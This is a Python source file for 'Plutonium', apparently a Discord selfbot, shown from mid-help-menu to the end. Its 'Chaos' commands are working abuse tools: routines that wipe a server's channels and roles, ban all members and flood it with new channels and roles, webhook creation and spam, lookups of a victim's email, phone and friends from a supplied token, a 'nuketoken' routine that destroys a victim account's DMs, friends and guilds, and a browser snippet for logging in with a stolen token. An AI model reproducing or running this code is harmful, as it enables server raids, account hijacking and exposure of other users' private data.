		embed.add_field(name=f"`{bot_prefix}sakebomb`", value="Sake Bomb gif for your viewing pleasure.", inline=False)
		embed.add_field(name=f"`{bot_prefix}doordash`", value="Random doordash text meme.", inline=False)
		embed.add_field(name=f"`{bot_prefix}pognt`", value="Vince McMahon's Pogn't gif.", inline=False)
		embed.add_field(name=f"`{bot_prefix}wallop`", value="Use before an online fight.", inline=False)
		embed.add_field(name=f"`{bot_prefix}water`", value="Mmmmm cave water.", inline=False)
		embed.add_field(name=f"`{bot_prefix}griffer`", value="View a picture of Griffer310. What an idiot.", inline=False)
		embed.add_field(name=f"`{bot_prefix}dan`", value="View a picture of Dan. What an idiot.", inline=False)
		embed.add_field(name=f"`{bot_prefix}clyde <message>`", value="Make Clyde, the discord bot, say something.", inline=False)
		embed.add_field(name=f"`{bot_prefix}changemymind <message>`", value="The classic change my mind meme with your own message.", inline=False)
		embed.add_field(name=f"`{bot_prefix}iphone <url>`", value="Put the image at your url inside of an iPhone X.", inline=False)
		embed.add_field(name=f"`{bot_prefix}trump <message>`", value="Have our old President say something important.", inline=False)
		embed.add_field(name=f"`{bot_prefix}tweet <user> <message>`", value="Make the selected user tweet a message.", inline=False)
		embed.add_field(name=f"`{bot_prefix}phcomment <user> <message>`", value="Catch someone leaving a comment on PornHub.", inline=False)
		embed.add_field(name=f"`{bot_prefix}mock <message>`", value="Turn normal text into mOcKiNg TeXt.", inline=False)

	elif cat == "nsfw":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙉𝙎𝙁𝙒"
		embed.description = "You know what this is. The valid nsfw commands are:\n"
		embed.description += f"`{bot_prefix}anal`, `{bot_prefix}erofeet`, `{bot_prefix}feet`, `{bot_prefix}hentai`, `{bot_prefix}boobs`, `{bot_prefix}cum`, `{bot_prefix}solo`, `{bot_prefix}futa`, `{bot_prefix}spank`, `{bot_prefix}trap`, `{bot_prefix}foxgirl`, `{bot_prefix}pussy`, `{bot_prefix}les`, `{bot_prefix}blowjob`, `{bot_prefix}lewdneko`, `{bot_prefix}lesbian`, `{bot_prefix}feed`, `{bot_prefix}tickle`, `{bot_prefix}slap`, `{bot_prefix}poke`, `{bot_prefix}hug`, `{bot_prefix}smug`, `{bot_prefix}pat`, `{bot_prefix}kiss`, `{bot_prefix}femdom`"

	else:
		await MsgEmbed(f"Please give a valid command category or do `{bot_prefix}help` to list the valid categories.", "Help").send(ctx)
		return

	await embed.send(ctx)

# Moderation commands

@plutonium.command()
async def ban(ctx, member: discord.User=None, delete_message_days: int=0):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Moderation").send(ctx)
	elif not member or member == plutonium.user:
		await MsgEmbed("Please give a valid user to ban.", "Moderation").send(ctx)
	else:
		try:
			await ctx.guild.ban(member, delete_message_days)
			logitem(f"{c.EC}{member}{c.LR} was banned from {c.EC}{ctx.guild.name}{c.LR}")
			await MsgEmbed(f"**{member.name}** has been banned from **{ctx.guild.name}.**", "Moderation").send(ctx)
		except:
			await MsgEmbed("Please give a valid user to ban.", "Moderation").send(ctx)

@plutonium.command()
async def kick(ctx, member: discord.User=None):
	if not ctx.guild:
		await ("You have to be in a guild to do that!", "Moderation").send(ctx)
	elif not member or member == plutonium.user:
		await MsgEmbed("Please give a valid user to kick.", "Moderation").send(ctx)
	else:
		try:
			await ctx.guild.kick(member)
			logitem(f"{c.EC}{member}{c.LR} was kicked from {c.EC}{ctx.guild.name}{c.LR}")
			await MsgEmbed(f"**{member.name}** has been kicked from **{ctx.guild.name}.**", "Moderation").send(ctx)
		except:
			await MsgEmbed("Please give a valid user to kick.", "Moderation").send(ctx)
	
@plutonium.command()
async def spurge(ctx, amount: int=10):
	messages = await ctx.channel.history(limit=1000).flatten()
	s_count = 0
	global do_loops
	do_loops = True	
	for msg in messages:
		if not do_loops:
			return
		try:
			if msg.author == plutonium.user:
				await msg.delete()
				s_count += 1
			if s_count == amount:
				return
		except:
			pass
	pass
	logitem(f"Self-Purged {c.EC}{amount} messages{c.LR} from {c.EC}{ctx.channel.name}{c.LR}")

@plutonium.command(aliases=["clear"])
async def purge(ctx, amount: int=10):
	try:
		await ctx.channel.purge(limit=amount)
		logitem(f"Purged {c.EC}{amount} messages{c.LR} from {c.EC}{ctx.channel.name}{c.LR}")
	except:
		await MsgEmbed("Unable to purge messages. Make sure you have the correct permissions.", "Moderation").send(ctx)

@plutonium.command(aliases=["massunban"])
async def unbanall(ctx):
	try:
		bans = await ctx.guild.bans()
	except:
		await MsgEmbed("You do not have permission to do that command!", "Moderation").send(ctx)
		return
	await MsgEmbed("Revoking all bans in this guild. Open the gates!", "Moderation").send(ctx)
	global do_loops
	do_loops = True
	for ban in bans:
		if not do_loops:
			return
		try:
			await ctx.guild.unban(ban.user)
		except:
			pass
	logitem(f"Revoked all bans from {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command(aliases=["hban"])
async def hackban(ctx, member: discord.User=None):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Moderation").send(ctx)
	elif not member or member == plutonium.user:
		await MsgEmbed("Please give a valid user to HTTP ban.", "Moderation").send(ctx)
	else:
		try:
			await plutonium.http.ban(member.id, ctx.guild.id, 0)
			logitem(f"{c.EC}{member}{c.LR} was HTTP Banned from {c.EC}{ctx.guild.name}{c.LR}")
			await MsgEmbed(f"**{member.name}** has been HTTP banned from **{ctx.guild.name}.**", "Moderation").send(ctx)
		except:
			await MsgEmbed("You do not have permission to HTTP ban that user.", "Moderation").send(ctx)

@hackban.error
async def hackban_error(ctx, error):
	await MsgEmbed("Unable to ban that user. Make sure you have the correct permissions.", "Moderation").send(ctx)

@plutonium.command(aliases=["del"])
async def delch(ctx):
	try:
		await ctx.channel.delete()
		logitem(f"Channel {c.EC}{ctx.channel.name}{c.LR} has been deleted")
	except:
		await MsgEmbed("Unable to delete channel. Make sure you have the correct permissions.", "Moderation").send(ctx)

@plutonium.command()
async def delclone(ctx):
	try:
		await ctx.channel.clone()
		await ctx.channel.delete()
		logitem(f"Channel has been {c.EC}cloned{c.LR} and {c.EC}deleted{c.LR}")
	except:
		await MsgEmbed("Unable to delete channel. Make sure you have the correct permissions.", "Moderation").send(ctx)

@plutonium.command()
async def clone(ctx):
	try:
		await ctx.channel.clone()
		logitem(f"Channel has been {c.EC}cloned{c.LR}")
	except:
		await MsgEmbed("Unable to delete channel. Make sure you have the correct permissions.", "Moderation").send(ctx)

@plutonium.command(aliases=["servername", "sname"])
async def gname(ctx, *, guild_name):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Moderation").send(ctx)
		return
	try:
		await ctx.guild.edit(name=guild_name)
		logitem(f"Guild name changed to {c.EC}{guild_name}{c.LR}")
	except:
		await MsgEmbed("Unable to edit the name of this guild.", "Moderation").send(ctx)

# Chaos commands

@plutonium.command()
async def massban(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	for member in ctx.guild.members:
		if not do_loops:
			return
		try:
			await member.ban()
		except:
			pass
	logitem(f"All members have been banned from {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def masskick(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	for member in ctx.guild.members:
		if not do_loops:
			return
		try:
			await member.kick()
		except:
			pass
	logitem(f"All members have been kicked from {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def rolenuke(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	try:
		for i in range(250):
			if not do_loops:
				return
			await ctx.guild.create_role(name="nuked-by-plutonium")
	except:
		pass
	logitem(f"Many, many roles have been created in {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def channuke(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	try:
		for i in range(250):
			if not do_loops:
				return
			await ctx.guild.create_text_channel(name="nuked-by-plutonium")
	except:
		pass
	logitem(f"Many, many channels have been created in {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command(aliases=["clearchannels"])
async def delchannels(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	for channel in ctx.guild.channels:
		if not do_loops:
			return
		try:
			await channel.delete()
		except:
			pass
	logitem(f"Deleted all channels from {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command(aliases=["clearroles"])
async def delroles(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	for role in ctx.guild.roles:
		if not do_loops:
			return
		try:
			await role.delete()
		except:
			pass
	logitem(f"Deleted all roles from {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command(aliases=["nuke"])
async def destroy(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	global do_loops
	do_loops = True
	logitem("Deleting roles...")
	for role in ctx.guild.roles:
		if not do_loops:
			return
		try:
			await role.delete()
		except:
			logitem("Failed to delete roles")
	logitem("Deleting channels...")
	for channel in ctx.guild.channels:
		if not do_loops:
			return
		try:
			await channel.delete()
		except:
			logitem("Failed to delete channel")
	logitem("Banning members...")
	for member in ctx.guild.members:
		if not do_loops:
			return
		try:
			await ctx.guild.ban(member)
		except:
			logitem("Failed to ban members")
	logitem("Editing guild name...")
	try:
		await ctx.guild.edit(name="Nuked by Plutonium", description="Nuked by Plutonium", reason="Being a gay server", banner=None)  
	except:
		pass
	logitem("Creating channels...")
	try:
		for i in range(250):
			if not do_loops:
				return
			await ctx.guild.create_text_channel(name="nuked-by-plutonium")
	except:
		pass
	logitem("Creating roles...")
	try:
		for i in range(250):
			if not do_loops:
				return
			await ctx.guild.create_role(name="Nuked by Plutonium")
	except:
		pass
	logitem(f"{c.EC}{ctx.guild.name}{c.LR} got absolutely bombed lmfao")

@plutonium.command()
async def renamechannels(ctx, *, name):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	if not name:
		await MsgEmbed("Please give a name to change the channels to!", "Chaos").send(ctx)
		return
	for channel in ctx.guild.channels:
		await channel.edit(name=name)
	logitem(f"All channels have been renamed in {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command(aliases=["webhooks"])
async def hooks(ctx, amount=None):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Chaos").send(ctx)
		return
	try:
		repeats = int(amount) if amount else 1
		if repeats < 1:
			raise Exception
	except:
		await MsgEmbed("Please give a valid number of webhooks to create for each channel.", "Chaos").send(ctx)
		return
	logitem(f"Attempting to create webhooks in {c.EC}{ctx.guild.name}{c.LR} - In the event that this command is frozen you are being ratelimited. The server is having an internal exception. You will have to wait before making webhooks in the current guild.")
	global do_loops
	do_loops = True
	urls = []
	for chan in ctx.guild.text_channels:
		if not do_loops:
			break
		try:
			if len(await chan.webhooks()) >= 10:
				continue
			wh_json = {"name": "Plutonium"}
			wh_headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': token}
			for _ in range(repeats):
				hook = requests.post(f"https://discord.com/api/v6/channels/{chan.id}/webhooks", json=wh_json, headers=wh_headers).json()
				urls.append(f"https://discord.com/api/webhooks/{hook['id']}/{hook['token']}")
				await asyncio.sleep(0.5)
		except Exception as e:
			print("There was an error creating the webhook. Either you are being ratelimited or there is a max number of webhooks created.")
	print(urls)
	if not "webhooks" in os.listdir():
		os.mkdir("webhooks")
	f_name = f"{ctx.guild.id}-wh.json"
	f_path = f"webhooks/{f_name}"
	print("loading")
	if not f_name in os.listdir("webhooks"):
		print("creating")
		f = open(f_path, "w+")
		json.dump({'name': ctx.guild.name, 'id': ctx.guild.id, 'hooks': []}, f, indent=4)
		f.close()
	json_data = {}
	with open(f_path, "r") as read_file:
		print("reading")
		json_data = json.load(read_file)
	temp_list = json_data['hooks']
	json_data['hooks'] = temp_list + urls
	with open(f_path, "w") as file:
		print("writing")
		print(json_data)
		json.dump(json_data, file, indent=4)
	logitem(f"Webhooks created and recorded successfully for guild {c.EC}{ctx.guild.name}{c.LR}")
	logitem(f"File: {c.EC}/webhooks/{f_name}{c.LR} : Count: {c.EC}{len(urls)}{c.LR}")
	logitem(f"Plutonium has no way of knowing if webhooks are valid. It is recommended that you clean up the files in webhooks/ periodically so that you are not spamming requests to invalid webhooks.")

@plutonium.command()
async def hookspam(ctx, quantity=None, msg=None):
	guild_id = None
	if not msg or not quantity:
		await MsgEmbed("Please give a valid message and quantity for the webhooks to send.", "Chaos").send(ctx)
		return
	pot_guild_id = msg.split(" ")[0]
	try:
		plutonium.get_guild(int(pot_guild_id)).name
		guild_id = pot_guild_id
	except:
		if not ctx.guild:
			await MsgEmbed("You must be in a guild to do that. Additionally, you can put the Guild ID after quantity to execute the hooks remotely.", "Chaos").send(ctx)
			return	
		else:
			guild_id = ctx.guild.id
	try:
		quantity = int(quantity) if quantity and int(quantity) < 1 else 10
	except:
		await MsgEmbed("Please give a valid number for the guild and quantity to send.", "Chaos").send(ctx)
		return
	if not "webhooks" in os.listdir():
		os.mkdir("webhooks")
	f_name = ""
	if not ctx.guild:
		if not guild_id:
			await MsgEmbed("Please do this in the guild you want to spam or use the guild's ID from the Webhook file.", "Chaos").send(ctx)
			return
		f_name = f"{guild_id}-wh.json"
	else:
		f_name = f"{ctx.guild.id}-wh.json"
	if not f_name in os.listdir("webhooks/"):
		await MsgEmbed(f"No webhooks found on file for Guild {guild_id if guild_id else ctx.guild.id}. Generate them using `{bot_prefix}hooks <count per channel>`.", "Chaos").send(ctx)
		return
	with open(f"webhooks/{f_name}") as source_file:
		data = json.load(source_file)
		await execute_hook_spam(data['id'], ctx, quantity, msg)
	
async def execute_hook_spam(target_id, ctx, quantity, message):
	target_hooks = []
	try:
		with open(f"webhooks/{target_id}-wh.json", "r") as data:
			target_hooks = json.load(data)['hooks']
	except:
		await MsgEmbed(f"No webhooks could be found for {target_id}. Generate some with `{bot_prefix}hooks <count per channel>`.", "Chaos").send(ctx)
		return
	logitem(f"Starting hook spam on Guild {c.EC}{target_id}{c.LR}")
	global do_loops
	do_loops = True
	for i in range(quantity):
		for target in target_hooks:
			if not do_loops:
				return
			try:
				await webhook_send(target, message)
			except:
				pass
	logitem(f"Completed hook spam on Guild {c.EC}{target_id}{c.LR}")

@plutonium.command()
async def tokeninfo(ctx, target=None):
	if not target:
		await MsgEmbed("Please give a token to get information for.", "Chaos").send(ctx)
		return
	logitem("Performing token lookup")
	request = requests.Session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': target,}
	logitem(f"Sending API Request: {c.EC}/api/v8/users/@me{c.LR}")
	data = request.get('https://canary.discord.com/api/v6/users/@me', headers=headers).json()
	if "message" in data:
		logitem("Invalid token. Ending lookup.")
		await MsgEmbed(f"That token is invalid: {data['message']}", "Chaos").send(ctx)
		return
	av_url = f"https://cdn.discord.com/avatars/{data['id']}/{data['avatar']}.png"
	embed = StdEmbed()
	embed.title = "Token Information"
	embed.set_thumbnail(url=av_url)
	embed.add_field(name="Email Address", value=data['email'], inline=True)
	embed.add_field(name="Phone Number", value=data['phone'] if data['phone'] else "No number attached", inline=True)
	embed.add_field(name="Verified", value="Yes" if data['verified'] else "No", inline=True)
	embed.add_field(name="Username", value=f"{data['username']}#{data['discriminator']}", inline=True)
	embed.add_field(name="User ID", value=data['id'], inline=True)
	embed.add_field(name="Locale", value=data['locale'], inline=True)
	embed.add_field(name="NSFW Allowed", value="Yes" if data['nsfw_allowed'] else "No", inline=True)
	embed.add_field(name="MFA Turned On", value="Yes" if data['mfa_enabled'] else "No", inline=True)
	embed.add_field(name="\u200B", value="\u200B", inline=True)
	embed.add_field(name="Avatar URL", value=av_url, inline=False)
	logitem(f"Sending API Request: {c.EC}/api/v8/users/@me/relationships{c.LR}")
	data = request.get('https://canary.discord.com/api/v6/users/@me/relationships', headers=headers).json()
	friends = []
	blocked = []
	incoming = []
	outgoing = []
	arrays = {1: friends, 2: blocked, 3: incoming, 4: outgoing}
	for rel in data:
		arrays[rel['type']].append(f"{rel['user']['id']} - {rel['user']['username']}#{rel['user']['discriminator']}")
	friend_msg = "**Friends:**" + ("".join(f"\n{f}" for f in friends) if len(friends) > 0 else "\nNo Friends")
	friend_embed = MsgEmbed(friend_msg, "Chaos")
	blocked_msg = "**Blocked Users:**" + ("".join(f"\n{f}" for f in blocked) if len(blocked) > 0 else "\nNo Blocked Users")
	blocked_embed = MsgEmbed(blocked_msg, "Chaos")
	incoming_msg = "**Incoming Friend Requests:**" + ("".join(f"\n{f}" for f in incoming) if len(incoming) > 0 else "\nNo Incoming Friend Requests")
	incoming_embed = MsgEmbed(incoming_msg, "Chaos")
	outgoing_msg = "**Outgoing Friend Requests:**" + ("".join(f"\n{f}" for f in outgoing) if len(outgoing) > 0 else "\nNo Outgoing Friend Requests")
	outgoing_embed = MsgEmbed(outgoing_msg, "Chaos")
	await embed.send(ctx)
	try:
		await friend_embed.send(ctx)
	except:
		await MsgEmbed(f"The friends list was too long to send: {len(friends)}", "Chaos").send(ctx)
	try:
		await blocked_embed.send(ctx)
	except:
		await MsgEmbed(f"The blocked users list was too long to send: {len(blocked)}", "Chaos").send(ctx)
	try:
		await incoming_embed.send(ctx)
	except:
		await MsgEmbed(f"The incoming friend request list was too long to send: {len(incoming)}", "Chaos").send(ctx)
	try:
		await outgoing_embed.send(ctx)
	except:
		await MsgEmbed(f"The outgoing friend request list was too long to send: {len(outgoing)}", "Chaos").send(ctx)
	logitem("Completed full display of information for the token")

# Rate limiting goes ham in this command but the hard limit before API Access is revoked is 10k requests in 10 minutes
@plutonium.command(aliases=["tokendelete"])
async def nuketoken(ctx, target=None): # Guys please don't ever actually use this command
	if not target:
		await MsgEmbed("Please give a token to obliterate.", "Chaos").send(ctx)
		return
	msg = await MsgEmbed("WARNING: This is an extraordinarily destructive command. It removes all connections from a token. The user will be left with no friends, no dms, no blocked users, no guilds, and a lot of pain. DO THIS AT YOUR OWN RISK!!! Additionally, this command will not use proxies and will be making requests from your IP Address. A VPN is strongly recommended. Reply with 'Confirm' to proceed. Once this is typed the nuke will begin, and may take a couple of minutes to complete due to CloudFlare restrictions.", "Chaos").send(ctx)
	reply = await plutonium.wait_for('message', check=lambda message: message.author == ctx.author)
	await msg.delete()
	if not reply.content.lower() == "confirm":
		await MsgEmbed("Cancelling token nuke. Stay safe!", "Chaos").send(ctx)
		try:
			await reply.delete()
		except:
			pass
		return
	try:
		await reply.delete()
	except:
		pass
	headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': target,}
	request = requests.Session()
	logitem(f"Sending API Request: {c.EC}/api/v6/users/@me{c.LR}")
	data = request.get('https://canary.discord.com/api/v8/users/@me', headers=headers).json()
	if "message" in data:
		logitem("Invalid token. Ending nuke.")
		await MsgEmbed(f"That token is invalid: {data['message']}", "Chaos").send(ctx)
		return
	logitem("Performing token nuke")
	warn = await MsgEmbed(f"Nuking the given token. This may take a long time, please be patient. You may cancel this questionable action at any time using `{bot_prefix}cancel`.", "Chaos").send(ctx)
	await warn.delete(delay=20)
	logitem(f"Sending API Request: {c.EC}/api/v6/users/@me/channels{c.LR}")
	data = request.get("https://canary.discord.com/api/v6/users/@me/channels", headers=headers, timeout=10).json()
	for channel in data:
		logitem(f"Deleting channel {c.EC}{channel['id']}{c.LR}")
		request.delete(f"https://canary.discord.com/api/v6/channels/{channel['id']}", headers=headers, timeout=10)
	logitem(f"Sending API Request: {c.EC}/api/v6/users/@me/relationships{c.LR}")
	data = request.get("https://canary.discord.com/api/v6/users/@me/relationships", headers=headers, timeout=10).json()
	for relationship in data:
		logitem(f"Deleting relationship {c.EC}{relationship['id']}{c.LR}")
		request.delete(f"https://canary.discord.com/api/v6/users/@me/relationships/{relationship['id']}", headers=headers, timeout=10)
	logitem(f"Sending API Request: {c.EC}/api/v6/users/@me/guilds{c.LR}")
	data = request.get("https://canary.discord.com/api/v6/users/@me/guilds", headers=headers, timeout=10).json()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Authorization': target,}
	for guild in data:
		logitem(f"Leaving guild {c.EC}{guild['id']}{c.LR}")
		if guild['owner']:
			try:
				logitem("Deleting guild")
				src = request.delete(f"https://canary.discord.com/api/v6/guilds/{guild['id']}", headers=headers, timeout=10)
				print(src.json())
			except:
				pass
		else:
			try:
				logitem("Leaving guild")
				src = request.delete(f"https://canary.discord.com/api/v6/users/@me/guilds/{guild['id']}", headers=headers, timeout=10)
				print(src.json())
			except:
				pass
	logitem(f"Token has been nuked. {c.EC}Tango Down.{c.LR}")

@plutonium.command(aliases=["check"])
async def checktoken(ctx, target=None):
	if not target:
		await MsgEmbed("Please give a token to check.", "Chaos").send(ctx)
		return
	logitem("Performing token lookup")
	request = requests.Session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': target,}
	logitem(f"Sending API Request: {c.EC}/api/v8/users/@me{c.LR}")
	data = request.get('https://canary.discord.com/api/v6/users/@me', headers=headers).json()
	invalid = "message" in data
	if invalid:
		await MsgEmbed(f"That token is not valid.", "Chaos").send(ctx)
	else:
		await MsgEmbed(f"That token is valid!\nUse `{bot_prefix}tokeninfo <token>` for more information or use `{bot_prefix}nuketoken <token>` to obliterate it.", "Chaos").send(ctx)
	logitem(f"Retrieved and displayed the validity of the token. Valid: {c.EC}{not invalid}{c.LR}")

@plutonium.command()
async def tokenlogin(ctx, target=None):
	if not target:
		await MsgEmbed("Please give a token to login as.", "Chaos").send(ctx)
		return
	await MsgEmbed(f"Execute the following code in the console:\n```location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = \"\\\"{target}\\\"\"```", "Chaos").send(ctx)

# Information commands

@plutonium.command(aliases=["whois", "who"])
async def user(ctx, member: discord.User=None):
	if not member:
		member = plutonium.user
	embed = StdEmbed()
	embed.title = f"User Information for {member}"
	embed.set_thumbnail(url=member.avatar_url)
	embed.add_field(name="Username", value=member.name, inline=True)
	embed.add_field(name="Discriminator", value=f"#{member.discriminator}", inline=True)
	if ctx.guild:
		user = await ctx.guild.fetch_member(member.id)
		embed.add_field(name="Nickname", value=user.display_name, inline=True)
	embed.add_field(name="User ID", value=member.id, inline=False)
	embed.add_field(name="Account created", value=member.created_at.strftime("%I:%M:%S %p - %A, %B %d, %Y"), inline=False)
	if not member == plutonium.user:
		embed.add_field(name="Is Friended", value=("Yes" if member in plutonium.user.friends else "No"), inline=True)
		embed.add_field(name="Is Blocked", value=("Yes" if member in plutonium.user.blocked else "No"), inline=True)
		embed.add_field(name="Bot Account", value=("Yes" if member.bot else "No"), inline=True)
	if ctx.guild:
		user = await ctx.guild.fetch_member(member.id)
		top_role = user.roles[len(user.roles) - 1]
		embed.add_field(name="Highest Role", value=f"<@&{top_role.id}>")
	await embed.send(ctx)

@plutonium.command()
async def pfp(ctx, member: discord.User=None):
	if not member:
		member = plutonium.user
	if not member.avatar_url:
		await MsgEmbed("That user does not have a custom avatar set!", "Information").send(ctx)
		return
	await ImgEmbed(f"{member.avatar_url}", f"Avatar for {member}").send(ctx)

@plutonium.command(aliases=["serverpfp", "gpfp"])
async def guildpfp(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Information").send(ctx)
		return
	if not ctx.guild.icon_url:
		await MsgEmbed("This guild does not have a custom icon set!", "Information").send(ctx)
		return
	await ImgEmbed(f"{ctx.guild.icon_url}", "Information").send(ctx)

@plutonium.command(aliases=["server"])
async def guild(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Information").send(ctx)
		return
	embed = StdEmbed()
	embed.title = f"Guild Information for {ctx.guild.name}"
	embed.set_thumbnail(url=ctx.guild.icon_url)
	embed.add_field(name="Server ID", value=ctx.guild.id, inline=False)
	embed.add_field(name="Created At", value=ctx.guild.created_at.strftime("%I:%M:%S %p - %A, %B %d, %Y"), inline=False)
	embed.add_field(name="Region", value=ctx.guild.region, inline=True)
	embed.add_field(name="Language", value=ctx.guild.preferred_locale, inline=True)
	embed.add_field(name="Owner", value=ctx.guild.owner, inline=True)
	embed.add_field(name="Channels", value=len(ctx.guild.channels), inline=True)
	embed.add_field(name="Text Channels", value=len(ctx.guild.text_channels), inline=True)
	embed.add_field(name="Voice Channels", value=len(ctx.guild.voice_channels), inline=True)
	embed.add_field(name="Emojis", value=len(ctx.guild.emojis), inline=True)
	embed.add_field(name="Boost Level", value=ctx.guild.premium_tier, inline=True)
	embed.add_field(name="Verification Level", value=ctx.guild.verification_level, inline=True)
	categories = ", ".join(cat.name for cat in ctx.guild.categories)[2:]
	if categories == "":
		categories = "No categories"
	embed.add_field(name="Categoires", value=categories, inline=False)
	await embed.send(ctx)

@plutonium.command()
async def channel(ctx):
	embed = StdEmbed()
	if ctx.guild:
		embed.set_thumbnail(url=ctx.guild.icon_url)
	elif isinstance(ctx.channel, discord.GroupChannel):
		embed.set_thumbnail(url=ctx.channel.icon_url)
	else:
		await MsgEmbed("You must be in a group chat or guild to do that!", "Information").send(ctx)
		return
	embed.title = f"Channel Information for {ctx.channel.name}"
	embed.add_field(name="Channel ID", value=ctx.channel.id, inline=False)
	embed.add_field(name="Created At", value=ctx.channel.created_at.strftime("%I:%M:%S %p - %A, %B %d, %Y"), inline=False)
	embed.add_field(name="Pin Count", value=len(await ctx.channel.pins()), inline=True)
	embed.add_field(name="Type", value=("Server" if ctx.guild else "Group Chat"))
	await embed.send(ctx)

@plutonium.command()
async def first(ctx):
	first_message = (await ctx.channel.history(limit=1, oldest_first=True).flatten())[0]
	embed = StdEmbed()
	embed.description = f"**Sent at:** {first_message.created_at.strftime('%I:%M:%S %p - %A, %B %d, %Y')}\n\n**{first_message.author}:** {first_message.content if not first_message.content == '' else '(No Text Content)'}\n{first_message.jump_url}"
	embed.url = first_message.jump_url
	await embed.send(ctx)

@plutonium.command()
async def guilds(ctx):
	embed = StdEmbed()
	embed.title = f"{plutonium.user.name}'s Guilds"
	desc = "Here is a list of all of your guilds:"
	if len(plutonium.guilds) == 0:
		desc += "\nYou are not in any guilds yet!"
	else:
		for item in plutonium.guilds:
			desc += f"\n{item.id} - {item.name}"
	embed.description = desc
	await embed.send(ctx)

# Miscellaneous commands

@plutonium.command()
async def readall(ctx):
	await MsgEmbed(f"Marked **{len(plutonium.guilds)}** guilds as read. Due to CloudFlare restrictions this may take a few minutes.", "Miscellaneous").send(ctx)
	for guild in await plutonium.fetch_guilds().flatten():
		await guild.ack()
		await asyncio.sleep(5)
	logitem(f"All guilds have been marked as read")

@plutonium.command()
async def read(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Miscellaneous").send(ctx)
		return
	await MsgEmbed(f"Marked **{ctx.guild.name}** as read.", "Miscellaneous").send(ctx)
	await ctx.guild.ack()
	logitem(f"{c.EC}{ctx.guild.name}{c.LR} has been marked as read")

@plutonium.command()
async def backup(ctx):
	await MsgEmbed("Backing up your friends and blocked users...\n-> backups/friends.txt, backups/blocks.txt", "Miscellaneous").send(ctx)
	if not os.path.exists("backups/"):
		os.mkdir("backups")
	friend_f = open("backups/friends.txt", "w+")
	friend_f.write("Friends:\n" + "\n".join(f"{friend}" for friend in plutonium.user.friends))
	friend_f.close()
	logitem(f"Friend list has been backed up")
	block_f = open("backups/blocks.txt", "w+")
	block_f.write("Blocked Users:\n" + "\n".join(f"{block}" for block in plutonium.user.blocked))
	block_f.close()
	logitem(f"Blocked users list has been backed up")

@plutonium.command()
async def gcleave(ctx):
	await MsgEmbed("Leaving all of your group chats...", "Miscellaneous").send(ctx)
	for channel in plutonium.private_channels:
		if isinstance(channel, discord.GroupChannel):
			await channel.leave()
	logitem(f"You left all of your group chats")

@plutonium.command()
async def activity(ctx, act_type=None, *, message=None):
	if not act_type:
		await MsgEmbed("Please give a valid activity: (`game`, `streaming`, `watching`, `listening`, or `reset`)", "Miscellaneous").send(ctx)
		return
	if not message and not act_type == "reset":
		await MsgEmbed("Please give a message for your new status.", "Miscellaneous").send(ctx)
		return
	activ = None
	if act_type == "game":
		activ = discord.Game(name=message)
	elif act_type == "streaming" or act_type == "stream":
		# Stream URL is for a 24/7 music stream, if this is broken then change the value
		activ = discord.Streaming(name=message, url="https://www.twitch.tv/monstercat")
	elif act_type == "watching":
		activ = discord.Activity(type=discord.ActivityType.watching(name=message))
	elif act_type == "listening":
		activ = discord.Activity(type=discord.ActivityType.listening(name=message))
	elif act_type == "reset":
		activ = None
	else:
		await MsgEmbed("Please give a valid activity: (`game`, `streaming`, `watching`, `listening`, or `reset`)", "Miscellaneous").send(ctx)
		return
	await plutonium.change_presence(activity=activ)
	await MsgEmbed("Your current activity has been changed!", "Miscellaneous").send(ctx)
	logitem(f"Activity changed successfully to {c.EC}'{act_type}'{c.LR}")

# Credit - TacticalSpoon331
